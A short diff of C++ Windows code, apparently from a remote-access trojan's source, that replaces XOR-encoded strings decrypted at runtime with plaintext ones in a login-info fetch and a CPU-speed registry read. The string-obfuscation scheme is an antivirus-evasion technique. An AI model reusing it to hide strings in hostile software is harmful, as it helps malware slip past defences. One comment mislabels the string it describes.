@@ -99,14 +99,16 @@ bool getLoginInfo(char *lpURL, char **lppszHost, LPDWORD lppPort, char **lppszPr
 	HINTERNET	hNet;
 	HINTERNET	hFile;
 
-	//strcry
-	char Mozilla[] = { 0x18,0x86,0xa5,0xb3,0xa1,0xab,0xaa,0xa4,0xeb,0xf7,0xec,0xf1,0xe0,0x97,0xdd,0xd2,0xd1,0xcb,0xdb,0xcd,0xd1,0xd5,0xda,0xd0,0x9d };	//Mozilla/4.0 (compatible)
-	char* pMozilla = decodeStr(Mozilla);					//解密函数
-
-	hNet = InternetOpen(pMozilla, INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
-
-	memset(pMozilla, 0, pMozilla[STR_CRY_LENGTH]);					//填充0
-	delete pMozilla;
+	//strcry----------------------------------------------------
+	//char Mozilla[] = { 0x18,0x86,0xa5,0xb3,0xa1,0xab,0xaa,0xa4,0xeb,0xf7,0xec,0xf1,0xe0,0x97,0xdd,0xd2,0xd1,0xcb,0xdb,0xcd,0xd1,0xd5,0xda,0xd0,0x9d };	//Mozilla/4.0 (compatible)
+	//char* pMozilla = decodeStr(Mozilla);					//解密函数
+	//
+	//hNet = InternetOpen(pMozilla, INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
+	//
+	//memset(pMozilla, 0, pMozilla[STR_CRY_LENGTH]);					//填充0
+	//delete pMozilla;
+	hNet = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);
+	//----------------------------------------------------------
 
 
 	if (hNet == NULL)
@@ -160,7 +162,11 @@ DWORD CPUClockMhz()
 	};	//WinSta0\Default
 	char* pHARDWARE = decodeStr(HARDWARE);  //解密函数
 
-	RegOpenKey(HKEY_LOCAL_MACHINE, pHARDWARE, &hKey);
+
+	//RegOpenKey(HKEY_LOCAL_MACHINE, pHARDWARE, &hKey);
+	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
+	//------------------------------------------------------------------------------------------------
+
 	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
 
 	RegCloseKey(hKey);
